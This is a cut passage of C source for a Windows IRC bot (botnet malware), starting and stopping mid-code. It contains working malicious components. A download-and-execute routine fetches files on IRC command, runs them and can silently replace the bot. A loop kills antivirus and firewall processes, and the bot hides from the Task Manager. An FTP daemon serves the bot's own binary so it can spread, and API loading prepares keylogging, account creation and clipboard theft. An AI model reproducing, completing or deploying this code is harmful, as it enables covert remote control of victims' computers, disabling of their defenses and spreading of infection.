								iRetVal=OS_UNKNOWN; 
					} else {	
						fclosesocket(sSocket); 
						return iRetVal; //
					} 
				} else {	
					fclosesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				fclosesocket(sSocket); 
				return iRetVal; 
			}
			fclosesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}

////////////////////// NO DOWNLOAD ////////////////////////////////////
#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"[DOWNLOAD]: Couldn't open file: %s.",dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
//			//addlog(buffer);

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) 
				sprintf(threads[dl.threadnum].name, "[DOWNLOAD]: File download: %s (%dKB transferred).", dl.url, total / 1024);
			else 
				sprintf(threads[dl.threadnum].name, "[DOWNLOAD]: Update: %s (%dKB transferred).", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"[DOWNLOAD]: Filesize is incorrect: (%d != %d).", total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
//				//addlog(buffer);
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		/* if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(buffer,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC Failed!",dl.notice);
			}
			
		} */
		free(fileTotBuff);
		

		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "[DOWNLOAD]: Downloaded %.1f KB to %s @ %.1f KB/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
//			//addlog(buffer);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"[DOWNLOAD]: Opened: %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
//					//addlog(buffer);
				}
			}

		// download is an update
		} else {
			sprintf(buffer, "[DOWNLOAD]: Downloaded %.1fKB to %s @ %.1fKB/sec. Updating.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
//			//addlog(buffer);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"[DOWNLOAD]: Update failed: Error executing file: %s.",dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
//				//addlog(buffer); //
			}
		}
	} else {
		sprintf(buffer,"[DOWNLOAD]: Bad URL, or DNS Error: %s.",dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		//addlog(buffer);
	}

	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif
////////////////// RANDOM NICK ///////////////////////
RNICK rnick[]={
	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	{"comp", COMPNICK, rndnickcomp},
	{"country", COUNTRYNICK, rndnickcountry},
	{"os", OSNICK, rndnickos}
};



char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
  
	return (strbuf); 
}

char *rndnickletter(char *strbuf)
{	
    srand(GetTickCount());	

	int randlen = (rand()%3)+maxrand;
	
	for (int i=0; i < randlen; i++) 
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

char *rndnickcomp(char *strbuf) 
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;
 
    srand(GetTickCount());
 
	if(!GetComputerName(lpszCompName, &cchBuff)) 
		lpszCompName="PC";
 
	for (i=65;i<91;i++) 
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood) 
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
 
	return (strbuf);
}

char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];
	
	unsigned int days = GetTickCount() / 86400000;
	if (days > 5)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};

char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(strbuf)):(strbuf));
}
////////////////// PROCESS /////////////////////////////
#ifndef NO_PROCESS

// globals
#ifndef NO_AVFW_KILL
int killer_delay = 30000;

//FIX ME, ENCRYPT THESE!! Make this global
char *kill_list[]={
   "blabla.exe"
};
#endif


BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
						#endif
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"[PROC]: Listing processes:");
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"[PROC]: Process list completed.");
	else 
		sprintf(sendbuf,"[PROC]: Process list failed.");

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
//	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param)
{
	while (1) {
		listProcesses(0,NULL,NULL,FALSE,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
#endif
#endif

/////////////////////// FTPD /////////////////////////////////
#ifndef NO_FTPD



SOCKET data_sock;

int ftp_Data_connect(char *ip,int port);
int Ftp_data_transfer();
int	FTP_PORT;
extern	SOCKET sock;

DWORD WINAPI ftpd(LPVOID pParam) {

	WSADATA wsdata;
	SOCKET listener;
	SOCKET newfd;

	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;

	char buf[100];
//	char t_buf[1024];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);    // clear the master and temp sets
	FD_ZERO(&read_fds);

	WSAStartup(0x0101, &wsdata);

	srand(time(NULL));

	FTP_PORT = rand() % 64000 + 1337;


	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(FTP_PORT);

	if (bind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	listen(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;


	while(1) {
		read_fds = master;
		if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			memset(buf,0,sizeof(buf));
			memset(tmpbuf,0,sizeof(tmpbuf));
			if (FD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						send(newfd, "220 StnyFtpd 0wns j0\n",21 , 0);
					}
				} else {
					if ((nbytes = recv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						closesocket(i);
					} else {
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							send(i,"331 Password required\n",22 , 0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							send(i,"230 User logged in.\n",20 , 0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							send(i,"215 StnyFtpd\n",13 , 0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							send(i,"350 Restarting.\n",16 , 0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							send(i,"257 \"/\" is current directory.\n",30 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							send(i,"200 Type set to A.\n",19 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							send(i,"200 Type set to I.\n",19 , 0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							char pasv[] = "425 Passive not supported on this server\n";
							send(i, pasv, strlen(pasv), 0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							char list[] = "226 Transfer complete\n";
							send(i, list, strlen(list), 0);
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							memset(p1,0,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							send(i,"200 PORT command successful.\n",29 , 0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							send(i,"150 Opening BINARY mode data connection\n",40 , 0);
							if(ftp_Data_connect(tmpip,(int)h) == 1) {
								if (Ftp_data_transfer() == 1) {
									send(i,"226 Transfer complete.\n",23 , 0);
									sprintf(sendbuf,".[..ROOTED..]. »»» ftp finished: %s:%d running %s",tmpip,FTP_PORT,ftp.filename);
									if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
//									addlog(sendbuf);

								}
							} else {
								send(i,"425 Can't open data connection.\n",32,0);
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							send(i,"221 Goodbye happy r00ting.\n",27 , 0);
						}
						memset(buf,0,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int ftp_Data_connect(char *ip,int port)
{
	struct	sockaddr_in	server;
	WSADATA wsdata;

	WSAStartup(0x0101, &wsdata);

	data_sock = socket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

	if (connect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
		closesocket(data_sock);
		WSACleanup();
		return 0;
	}
	return 1;
}

int Ftp_data_transfer() {
	FILE * fid;
	char myfname[MAX_PATH];
	unsigned char buffer[1024];
	GetModuleFileName(NULL,myfname,sizeof(myfname));

	fid = fopen(myfname, "rb");
	if (!fid) { return 0; }

	while(!feof(fid))
	{
		fread(&buffer, sizeof(buffer), 1, fid);
		send(data_sock, (const char*)buffer, sizeof(buffer), 0);
		Sleep(1);
	}
	fclose(fid);
	closesocket(data_sock);
	WSACleanup();
	return 1;
}

#endif

////////////////////////// LOAD DLLS ///////////////
// kernel32.dll function variables
SEM fSetErrorMode;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;
M32F fModule32First;
GDFSE fGetDiskFreeSpaceEx;
GLDS fGetLogicalDriveStrings;
GDT fGetDriveType;
SP fSearchPath;
QPC fQueryPerformanceCounter;
QPF fQueryPerformanceFrequency;
RSP fRegisterServiceProcess;

// user32.dll function variables
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;
#ifndef NO_KEYLOG
GAKS fGetAsyncKeyState;
GKS fGetKeyState;
GWT fGetWindowText;
GFW fGetForegroundWindow;
#endif

// advapi32.dll function variables
ROKE fRegOpenKeyEx;
RCKE fRegCreateKeyEx;
RSVE fRegSetValueEx;
RQVE fRegQueryValueEx;
RDV fRegDeleteValue;
RCK fRegCloseKey;

#ifndef NO_PROCESS
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;
#endif
#ifndef NO_NET
OSCM fOpenSCManager;
OS fOpenService;
SS fStartService;
CS fControlService;
DS fDeleteService;
CSH fCloseServiceHandle;
ESS fEnumServicesStatus;
IVSD fIsValidSecurityDescriptor;
#endif
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif

// gdi32.dll function variables
CDC fCreateDC;
CDIBS fCreateDIBSection;
CCDC fCreateCompatibleDC;
GDC fGetDeviceCaps;
GDIBCT fGetDIBColorTable;
SO fSelectObject;
BB fBitBlt;
DDC fDeleteDC;
DO fDeleteObject;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
WSAAS fWSAAsyncSelect;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
NTOHS fntohs;
NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
RECVFROM frecvfrom;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;

HANDLE ih;

// icmp.dll function variables
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif

// netapi32.dll function variables
NSA fNetShareAdd;
NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;

// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;




// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;


BOOL LoadDLLs(void) 
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
		fModule32First = (M32F)GetProcAddress(kernel32_dll, "Module32First");
		fGetDiskFreeSpaceEx = (GDFSE)GetProcAddress(kernel32_dll, "GetDiskFreeSpaceExA");
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, "GetLogicalDriveStringsA");
		fGetDriveType = (GDT)GetProcAddress(kernel32_dll, "GetDriveTypeA");
		fSearchPath = (SP)GetProcAddress(kernel32_dll, "SearchPathA");
		fQueryPerformanceCounter = (QPC)GetProcAddress(kernel32_dll, "QueryPerformanceCounter");
		fQueryPerformanceFrequency = (QPF)GetProcAddress(kernel32_dll, "QueryPerformanceFrequency");

		if (!fSetErrorMode || !fCreateToolhelp32Snapshot || !fProcess32First || !fProcess32Next 
			|| !fGetDiskFreeSpaceEx || !fGetLogicalDriveStrings || !fGetDriveType || !fSearchPath 
			|| !fQueryPerformanceCounter || !fQueryPerformanceFrequency)
			nokernel32 = TRUE;

		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		// hide from the Windows 9x Task Manager
		if (fRegisterServiceProcess) 
			fRegisterServiceProcess(0, 1);
	} else {
		nokernel32err = GetLastError();
		nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow 
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;

		#ifndef NO_KEYLOG
		fGetAsyncKeyState = (GAKS)GetProcAddress(user32_dll,"GetAsyncKeyState");
		fGetKeyState = (GKS)GetProcAddress(user32_dll,"GetKeyState");
		fGetWindowText = (GWT)GetProcAddress(user32_dll,"GetWindowTextA");
		fGetForegroundWindow = (GFW)GetProcAddress(user32_dll,"GetForegroundWindow");

		if (!fGetAsyncKeyState || !fGetKeyState || !fGetWindowText || !fGetForegroundWindow) 
			nouser32 = TRUE;
		#endif
	} else {
		nouser32err = GetLastError();
		nouser32 = TRUE;
	}

	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = GetModuleHandle("advapi32.dll");
    if (advapi32_dll) {
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll,"RegOpenKeyExA");
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll,"RegCreateKeyExA");
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll,"RegSetValueExA");
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll,"RegQueryValueExA");
		fRegDeleteValue = (RDV)GetProcAddress(advapi32_dll,"RegDeleteValueA");
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll,"RegCloseKey");

		if (!fRegOpenKeyEx || !fRegCreateKeyEx || !fRegSetValueEx 
			|| !fRegQueryValueEx || !fRegDeleteValue || !fRegCloseKey)
	        noadvapi32 = TRUE;

		#ifndef NO_PROCESS
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges) 
	        noadvapi32 = TRUE;		
		#endif

		#ifndef NO_NET
	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
	 	fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus || !fIsValidSecurityDescriptor)
	        noadvapi32 = TRUE;
		#endif

		#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");

